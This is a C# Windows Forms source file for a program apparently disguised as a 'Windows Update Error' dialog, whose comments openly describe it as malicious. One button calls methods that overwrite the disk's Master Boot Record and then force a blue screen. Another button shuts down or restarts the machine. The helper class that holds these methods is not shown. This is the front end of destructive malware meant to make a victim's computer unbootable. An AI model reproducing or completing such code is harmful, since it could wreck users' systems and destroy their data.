﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Windows_Update_Error
{
    // This class represents a form (Form2) in the Windows Forms application.
    // It contains event handlers for button clicks that perform malicious operations related to system disruption.
    public partial class Form2 : Form
    {
        // The constructor of the Form2 class.
        // It initializes the components of the form. This call is typically generated by the Visual Studio designer and is responsible for setting up the visual elements of the form.
        public Form2()
        {
            InitializeComponent();
        }

        // Event handler for the click event of button1.
        // This method is executed when the user clicks on button1.
        private void button1_Click(object sender, EventArgs e)
        {
            // Create an instance of the Test class.
            // The Test class contains methods for performing critical system-level operations as part of the malicious functionality.
            Test test = new Test();
            // Call the killmbrA method of the test instance to perform specific modification operations on the hard disk's Master Boot Record (MBR).
            // Modifying the MBR can severely disrupt the normal boot process of the computer.
            test.killmbrA();
            // Pause the execution of the current thread for 1 second.
            // This is to ensure that the previous operation (modifying the Master Boot Record) can be completed.
            // It helps avoid logical errors or situations where subsequent operations don't take effect due to timing issues, ensuring that the sequence of operations is executed as expected.
            Thread.Sleep(1000);
            // Call the Nt_Error method of the test instance to trigger a blue screen of death (BSOD) on the system.
            // This causes the system to crash, which is a malicious action disrupting normal system operation.
            test.Nt_Error();
        }

        // Event handler for the click event of button2.
        // The code logic within this method is executed when the user clicks on the button2.
        // Its main purpose is to perform the operation of shutting down the computer.
        private void button2_Click(object sender, EventArgs e)
        {
            // Create an instance of the Test class.
            // This is done to be able to call the Shutdown_PC method defined in this class.
            Test test2 = new Test();
            // Call the Shutdown_PC method of the test2 instance to restart the computer.
            // This action is part of the malicious behavior designed to disrupt the normal usage of the system.
            test2.Shutdown_PC();
        }
    }
}